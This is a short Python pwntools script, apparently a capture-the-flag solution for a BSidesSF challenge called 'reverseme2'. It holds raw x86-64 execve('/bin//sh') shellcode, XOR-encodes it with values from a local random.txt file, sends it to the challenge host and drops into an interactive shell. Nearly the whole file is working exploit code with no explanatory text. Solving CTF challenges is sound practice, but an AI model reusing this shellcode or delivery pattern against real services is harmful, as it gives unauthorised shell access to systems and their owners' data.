from pwn import *

shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
rands = open("./random.txt", "rt").read().strip().split(' ')
rands = map(int, rands)

shellcode = b''.join(map(lambda x: (x[0] ^ (x[1] & 0xFF)).to_bytes(1, 'little'), list(zip(list(shellcode), rands))))
elf = context.binary = ELF("./reverseme2")

# p = gdb.debug(elf.path)
# p = process(elf.path)
p = remote('reverseme2-24b392b5.challenges.bsidessf.net', 1339)

print(p.recvline())
p.sendline(shellcode)
p.interactive()



